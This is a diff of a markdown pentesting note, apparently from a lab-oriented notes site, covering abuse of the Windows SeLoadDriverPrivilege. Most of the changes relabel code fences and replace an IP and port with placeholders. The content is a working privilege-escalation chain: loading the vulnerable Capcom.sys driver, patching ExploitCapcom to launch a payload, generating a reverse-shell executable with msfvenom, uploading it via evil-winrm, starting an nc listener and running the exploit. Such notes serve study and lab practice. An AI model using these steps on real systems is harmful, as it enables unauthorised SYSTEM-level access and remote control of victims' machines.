@@ -4,14 +4,13 @@ date: 2024-7-18
 tags: ["SeLoadDriverPrivilege", "privesc", "Windows", "Backup Operators", "diskshadow", "secretsdump"]
 ---
 
----
 ### Abuse #1: Install malicious driver
 
 #### 1. Compile eoploaddriver
 
 <div>
 
-```bash
+```console
 +---------------------------------------------------------------------------------------+
 | 1. Open Visual Studio 2022                                                            |
 | 2. Create a new project                                                               |
@@ -37,7 +36,7 @@ tags: ["SeLoadDriverPrivilege", "privesc", "Windows", "Backup Operators", "disks
 
 <div>
 
-```bash
+```console
 +----------------------------------------------------------------------------------------+
 | 1. Double click ExploitCapcom.sln                                                      |
 | 2. Replace the payload to `TCHAR CommandLine[] = TEXT("C:\\Windows\\Tasks\\rev.exe");` |
@@ -55,8 +54,8 @@ tags: ["SeLoadDriverPrivilege", "privesc", "Windows", "Backup Operators", "disks
 
 <div>
 
-```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o rev.exe
+```console
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f exe -o rev.exe
 ```
 
 </div>
@@ -65,20 +64,20 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o 
 
 <div>
 
-```powershell
+```console
 # For example (evil-winrm)
 upload Eoploaddriver.exe C:\ProgramData\Eoploaddriver.exe
 ```
 
-```powershell
+```console
 upload Capcom.sys C:\ProgramData\Capcom.sys
 ```
 
-```powershell
+```console
 upload ExploitCapcom.exe C:\ProgramData\ExploitCapcom.exe
 ```
 
-```powershell
+```console
 upload rev.exe C:\ProgramData\rev.exe
 ```
 
@@ -88,16 +87,16 @@ upload rev.exe C:\ProgramData\rev.exe
 
 <div>
 
-```bash
+```console
 # Start a nc listener
-rlwrap nc -lvnp 443
+rlwrap nc -lvnp <LOCAL_PORT>
 ```
 
-```powershell
+```console
 C:\ProgramData\Eoploaddriver.exe System\CurrentControlSet\test C:\ProgramData\Capcom.sys
 ```
 
-```powershell
+```console
 C:\ProgramData\ExploitCapcom.exe
 ```
 
